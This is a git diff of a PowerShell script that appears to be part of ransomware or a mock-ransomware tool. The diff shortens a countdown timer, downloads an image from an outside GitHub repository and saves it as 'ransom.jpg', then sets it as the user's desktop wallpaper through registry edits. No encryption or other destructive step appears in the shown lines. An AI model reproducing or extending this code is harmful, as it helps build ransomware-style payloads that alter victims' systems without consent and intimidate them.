@@ -393,7 +393,7 @@ $objTextBox1.Scrollbars = "Vertical"
 $form.Font = $Font2
 $Form.Controls.Add($objTextBox1) 
 
-$delay = 30
+$delay = 5
 
 $Counter_Label = New-Object System.Windows.Forms.Label
 $Counter_Label.Location = New-Object System.Drawing.Size(50,600) 
@@ -417,7 +417,7 @@ $delay -= 1
 }
 $Form.Close()
 $background = "https://raw.githubusercontent.com/ecoterror443/filerepo/main/img.png"
-Invoke-WebRequest -Uri $background -OutFile "c:/users/$env:USERNAME/img.png"
+Invoke-WebRequest -Uri $background -OutFile "c:/users/$env:USERNAME/ransom.jpg"
 # Start-Sleep -s 2
 <#
 #Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name WallPaper -value ''
@@ -425,7 +425,7 @@ New-ItemProperty -Path "HKCU:\Control Panel\Personalization" -Name "DesktopImage
 New-ItemProperty -Path "HKCU:\Control Panel\Personalization"-Name "DesktopImagePath" -Value "/users/$env:USERNAME/img.png" -PropertyType STRING -Force | Out-Null
 New-ItemProperty -Path "HKCU:\Control Panel\Personalization" -Name "DesktopImageUrl" -Value "/users/$env:USERNAME/img.png" -PropertyType STRING -Force | Out-Null
 #>
-$wallpaper = "C:/users/$env:USERNAME/img.png"
+$wallpaper = "C:/users/$env:USERNAME/ransom.jpg"
 Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -value "$wallpaper"
 Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -value "10"
 Start-Sleep -s 2
